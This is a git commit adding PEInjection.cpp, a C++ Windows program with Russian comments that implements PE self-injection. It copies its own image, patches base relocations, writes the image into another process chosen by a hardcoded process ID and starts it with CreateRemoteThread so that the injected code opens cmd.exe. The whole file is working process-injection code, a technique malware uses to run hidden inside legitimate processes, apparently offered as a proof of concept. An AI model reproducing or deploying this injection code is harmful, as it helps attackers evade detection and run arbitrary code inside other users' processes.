bd8666068d3a5777de5dfbcabe6f50e0459a5f44
CyberDen <110781601+CyberDen1@users.noreply.github.com>
2025-03-06 21:55:22 -0500

    Add files via upload

---
+++ PEInjection.cpp
@@ -0,0 +1,63 @@
+﻿#include <stdio.h>
+#include <Windows.h>
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+
+DWORD InjectionEntryPoint()
+{
+	WinExec("cmd.exe", SW_SHOW);
+	return 0;
+}
+
+int main()
+{
+	// Получение базового адреса образа
+	PVOID imageBase = GetModuleHandle(NULL);
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
+	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
+
+	// Выделение нового блока памяти и копирование текущего образа PE в этот новый блок памяти
+	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
+	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
+
+	// Процесс, в который мы будем внедрять этот PE
+	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 15204);
+
+	// Выделение нового блока памяти в целевом процессе. Именно сюда мы будем внедрять наш PE
+	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// Вычисление дельты между адресами, где образ будет находиться в целевом процессе, и тем, где он находится сейчас
+	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
+
+	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	DWORD relocationEntriesCount = 0;
+	PDWORD_PTR patchedAddress;
+	PBASE_RELOCATION_ENTRY relocationRVA = NULL;
+
+	while (relocationTable->SizeOfBlock > 0)
+	{
+		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
+		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
+
+		for (short i = 0; i < relocationEntriesCount; i++)
+		{
+			if (relocationRVA[i].Offset)
+			{
+				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
+				*patchedAddress += deltaImageBase;
+			}
+		}
+		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
+	}
+
+	// Запись в целевой процесс
+	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
+
+	// Запуск инжектированного PE внутри целевого процесса
+	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
+
+	return 0;
+}
